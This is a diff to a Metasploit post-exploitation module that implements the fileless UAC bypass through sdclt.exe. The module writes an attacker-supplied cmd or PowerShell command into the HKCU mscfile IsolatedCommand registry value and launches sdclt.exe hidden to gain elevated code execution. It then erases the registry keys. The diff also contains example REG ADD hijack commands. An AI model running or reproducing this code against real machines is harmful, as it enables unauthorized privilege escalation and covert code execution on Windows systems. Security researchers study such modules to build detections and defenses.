@@ -38,11 +38,6 @@
 # Check target vulnerability settings/status?  => set CHECK_VULN true
 # Delete malicious registry hive keys/values?  => set DEL_REGKEY true
 # Use powershell.exe to execute our command?   => set USE_POWERSHELL true
-# ---
-# HINT: To execute a powershell command we need the follow settings active:
-# EXAMPLE: set USE_POWERSHELL true
-# EXAMPLE: set EXEC_COMMAND start chrome.exe www.youporn.com
-# ---
 #
 #
 #
@@ -66,9 +61,8 @@
 # In some linux distributions postgresql needs to be started and
 # metasploit database deleted/rebuild to be abble to load module.
 # 1 - service postgresql start
-# 2 - msfdb delete (optional)
-# 3 - msfdb init   (optional)
-# 4 - msfconsole -x 'reload_all'
+# 2 - msfdb reinit (optional)
+# 3 - msfconsole -x 'reload_all'
 ##
 
 
@@ -107,16 +101,16 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'enigma fileless uac bypass [sdclt.exe]',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe or powershell.exe. This module will create the required registry entry in the current user’s hive, set the reg_sz value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
+                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe or powershell.exe This module will create the required registry entry in the current user’s hive, set the reg_sz value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln discover: enigma0x3 | mattifestation', # credits
+                                        'Vuln discover: enigma0x3 | mattifestation',  # vulnerability credits
                                 ],
  
-                        'Version'        => '$Revision: 1.4',
+                        'Version'        => '$Revision: 1.5',
                         'DisclosureDate' => 'mar 18 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -144,14 +138,14 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('EXEC_COMMAND', [ false, 'The cmd command to be executed (eg start notepad.exe)']),
-                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false])
+                                OptString.new('EXEC_COMMAND', [ false, 'The command to be executed (eg start notepad.exe)']),
+                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability details/status?' , false])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe to execute our command?' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false])
+                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell -Command to execute our command?' , false]),
+                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry hive/keys?' , false])
                         ], self.class) 
 
         end
@@ -175,7 +169,7 @@ end
 
   r=''
   vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
-  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode base64)
+  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level registry key
   vul_value = "IsolatedCommand" # vulnerable registry value to create
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
@@ -234,26 +228,28 @@ end
       end
 
         #
-        # chose to execute a single command in cmd.exe syntax logic
-        # or to execute a shellcode(base64) string using powershell.exe
+        # chose to execute a single command in cmd.exe syntax
+        # or to execute command using powershell.exe syntax
         #
         if datastore['USE_POWERSHELL'] == true
           comm_inje = "#{regi_hive} /v #{vul_value} /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
-          print_good(" exec => Injecting shellcode(base64) string (powershell.exe)")
+          print_good(" exec => Creating registry powershell command data")
+          print_good("   data: #{psh_comma} #{exec_comm}")
           Rex::sleep(1.0)
         else
           comm_inje = "#{regi_hive} /v #{vul_value} /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
-          print_good(" exec => Injecting cmd command string (cmd.exe)")
+          print_good(" exec => Creating registry cmd command data")
+          print_good("   data: #{comm_path} #{exec_comm}")
           Rex::sleep(1.0)
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe) ..
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsdD==" /f
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "%windir%\System32\cmd.exe /c start notepad.exe" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "powershell.exe -Command start notepad.exe" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "cmd.exe /c start notepad.exe" /f
  print_good(" exec => Hijacking process to gain code execution ..")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
- Rex::sleep(4.5)
+ Rex::sleep(4.0)
 
       # start remote service to gain code execution
       print_good(" exec => Starting #{vul_serve} native process ..")
@@ -314,6 +310,7 @@ def ls_stage2
  # Delete hijacking hive keys from target regedit ..
  # REG DELETE HKCU\Software\Classes\exefile /f
  print_good(" exec => Deleting HKCU hive registry keys ..")
+ print_good(" exec => cmd.exe /c #{reg_clean}")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
